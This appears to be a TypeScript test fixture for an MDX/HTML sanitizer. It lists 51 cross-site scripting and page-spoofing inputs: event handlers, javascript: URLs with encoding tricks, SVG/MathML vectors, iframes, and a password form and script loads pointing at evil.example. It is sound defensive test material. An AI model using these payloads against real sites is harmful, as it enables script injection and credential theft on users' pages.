/**
 * Raw HTML that would run script, restyle the page, collect what a reader
 * types, or pass itself off as the reader UI, written every way found to
 * reach a built page: each one MDX compiles. Every payload is `alert(n)`, so
 * a test can look for "alert" in what the site, the check, the exports, or
 * GitBook keep. `keeps` is text the page still shows (or an image's alt).
 *
 * Shared by the allowlist's tests: utils/markdown.test.ts, the site's step
 * (markdown/safe-html.test.ts and scripts/site-html.test.ts, a real build),
 * validators/content-check.test.ts, exports/html-allowlist.test.ts, and
 * scripts/lib/gitbook.test.ts.
 */
export type UnsafeHtml = { attack: string; mdx: string; keeps?: string };

export const UNSAFE_HTML: readonly UnsafeHtml[] = [
	{
		attack: "an event handler",
		mdx: '<img src="/images/a.png" onerror="alert(1)" alt="lower handler" />',
		keeps: "lower handler",
	},
	{
		attack: "an event handler in capitals",
		mdx: '<img src="/images/a.png" ONERROR="alert(2)" alt="capital handler" />',
		keeps: "capital handler",
	},
	{
		attack: "an event handler in JSX's camel case",
		mdx: '<img src="/images/a.png" onError="alert(3)" alt="camel handler" />',
		keeps: "camel handler",
	},
	{
		attack: "an event handler with character references",
		mdx: '<p onclick="&#97;lert(4)">encoded handler</p>',
		keeps: "encoded handler",
	},
	{
		attack: "an event handler as an expression",
		mdx: '<p onmouseover={"alert(5)"}>expression handler</p>',
		keeps: "expression handler",
	},
	{
		attack: "an event handler on a kept element that fires by itself",
		mdx: '<details open ontoggle="alert(6)"><summary>toggle words</summary>more</details>',
		keeps: "toggle words",
	},
	{ attack: "a script", mdx: "<script>alert(7)</script>" },
	{ attack: "a script in mixed case", mdx: "<sCRIPT>alert(8)</sCRIPT>" },
	{
		attack: "a script from elsewhere",
		mdx: '<script src="https://evil.example/alert(9).js"></script>',
	},
	{
		attack: "a style sheet",
		mdx: '<style>{"body { background: url(javascript:alert(10)) }"}</style>',
	},
	{
		attack: "a refresh",
		mdx: '<meta httpEquiv="refresh" content="0;url=javascript:alert(11)" />',
	},
	{
		attack: "a base address",
		mdx: '<base href="https://evil.example/alert(12)/" />',
	},
	{
		attack: "a linked style sheet",
		mdx: '<link rel="stylesheet" href="https://evil.example/alert(13).css" />',
	},
	{
		attack: "inline style with a script address",
		mdx: '<span style="background:url(javascript:alert(14))">styled words</span>',
		keeps: "styled words",
	},
	{
		attack: "inline style as an object",
		mdx: '<div style={{ background: "url(javascript:alert(15))" }}>style object words</div>',
		keeps: "style object words",
	},
	{
		attack: "a script in an SVG",
		mdx: "<svg><script>alert(16)</script><text>svg words</text></svg>",
		keeps: "svg words",
	},
	{
		attack: "HTML in an SVG's foreignObject",
		mdx: '<svg><foreignObject><img src="/images/a.png" onerror="alert(17)" alt="foreign words" /></foreignObject></svg>',
		keeps: "foreign words",
	},
	{
		attack: "an SVG that runs script when it loads",
		mdx: '<svg onload="alert(18)"><circle r="1" /></svg>',
	},
	{
		attack: "an SVG animation that rewrites a link",
		mdx: '<svg><a href="https://example.com/"><animate attributeName="href" values="javascript:alert(19)" /><text>animated words</text></a></svg>',
		keeps: "animated words",
	},
	{
		attack: "an SVG link in xlink:href",
		mdx: '<svg><a xlink:href="javascript:alert(20)"><text>xlink words</text></a></svg>',
		keeps: "xlink words",
	},
	{
		attack: "a MathML action's link",
		mdx: '<math><maction actiontype="statusline" xlink:href="javascript:alert(21)">math words</maction></math>',
		keeps: "math words",
	},
	{
		attack: "a MathML link",
		mdx: '<math href="javascript:alert(22)"><mi>math link words</mi></math>',
		keeps: "math link words",
	},
	{
		attack: "an address after a control character's reference",
		mdx: '<a href="&#1;javascript:alert(23)">control words</a>',
		keeps: "control words",
	},
	{
		attack: "an address after a NUL's reference",
		mdx: '<a href="&#0;javascript:alert(24)">nul words</a>',
		keeps: "nul words",
	},
	{
		attack: "an address after a control character",
		mdx: '<a href="\u0001javascript:alert(25)">raw control words</a>',
		keeps: "raw control words",
	},
	{
		attack: "an address with a tab in its scheme",
		mdx: '<a href="java&#x09;script:alert(26)">tab words</a>',
		keeps: "tab words",
	},
	{
		attack: "an address with a named reference for its colon",
		mdx: '<a href="javascript&colon;alert(27)">colon words</a>',
		keeps: "colon words",
	},
	{
		attack: "a document in an embed",
		mdx: '<iframe src="https://example.com/embed" srcdoc="<script>alert(28)</script>"></iframe>',
	},
	{
		attack: "an embed that runs script and asks for the camera",
		mdx: '<iframe src="https://example.com/frame" onload="alert(29)" allow="camera; autoplay"></iframe>',
	},
	{
		attack: "what an embed holds",
		mdx: '<iframe src="https://example.com/frame"><img src="/images/a.png" onerror="alert(30)" /></iframe>',
	},
	{
		attack: "Astro's set:html",
		mdx: '<div set:html="<img src=x onerror=alert(31)>" />',
	},
	{
		attack: "Astro's set:html on a Fragment",
		mdx: '<Fragment set:html="<img src=x onerror=alert(32)>" />',
	},
	{
		attack: "an expression that writes an element",
		mdx: '{<img src="/images/a.png" onerror="alert(33)" />}',
	},
	{
		attack: "an expression that calls the JSX runtime",
		mdx: '{_jsx("img", { src: "/images/a.png", onerror: "alert(34)" })}',
	},
	{
		attack: "an export used by set:html",
		mdx: 'export const payload = "<img src=x onerror=alert(35)>";\n\n<span set:html={payload}>export words</span>',
	},
	{
		attack: "an export that wraps the page",
		mdx: 'export default function Layout({ children }) { return <div title="alert(36)">{children}</div>; }',
	},
	{
		attack: "a body's handler, which a browser moves onto the page's body",
		mdx: '<body onload="alert(37)">body words</body>',
		keeps: "body words",
	},
	{
		attack: "a form that asks for a password",
		mdx: '<form action="https://evil.example/alert(38)"><input name="password" type="password" /><button>form words</button></form>',
		keeps: "form words",
	},
	{
		attack: "an embedded object",
		mdx: '<object data="https://evil.example/alert(39).swf">object words</object>',
		keeps: "object words",
	},
	{
		attack: "an embedded plugin",
		mdx: 'Before <embed src="https://evil.example/alert(40)" /> after.',
		keeps: "Before",
	},
	{
		attack: "a template",
		mdx: '<template><img src="/images/a.png" onerror="alert(41)" /></template>',
	},
	{
		attack: "what shows without script",
		mdx: '<noscript><img src="/images/a.png" onerror="alert(42)" /></noscript>',
	},
	{
		attack: "the reader UI's own data attributes",
		mdx: '<p data-resume-reading data-resume-chapters=\'[{"slug":"x","label":"x","href":"//evil.example/alert(43)"}]\'>spoof words</p>',
		keeps: "spoof words",
	},
	{
		attack: "a spread",
		mdx: '<a href="https://example.com/" {...{ onclick: "alert(44)" }}>spread words</a>',
		keeps: "spread words",
	},
	{
		attack: "a base address on an element",
		mdx: '<p xml:base="javascript:alert(45)//"><a href="x">base words</a></p>',
		keeps: "base words",
	},
	{
		attack: "a tracking ping",
		mdx: '<a href="https://example.com/" ping="https://evil.example/alert(46)">ping words</a>',
		keeps: "ping words",
	},
	{
		attack: "an obsolete element's handler",
		mdx: '<marquee onstart="alert(47)">marquee words</marquee>',
		keeps: "marquee words",
	},
	{
		attack: "a script with a namespace",
		mdx: "<svg:script>alert(48)</svg:script>",
	},
	{
		attack: "a fragment",
		mdx: '<>fragment words <img src="/images/a.png" onerror="alert(49)" /></>',
		keeps: "fragment words",
	},
	{
		attack: "a media source's handler",
		mdx: '<video><source onerror="alert(50)" /></video>',
	},
	{
		attack: "a field that runs script when it takes focus",
		mdx: '<input autofocus onfocus="alert(51)" />',
	},
];
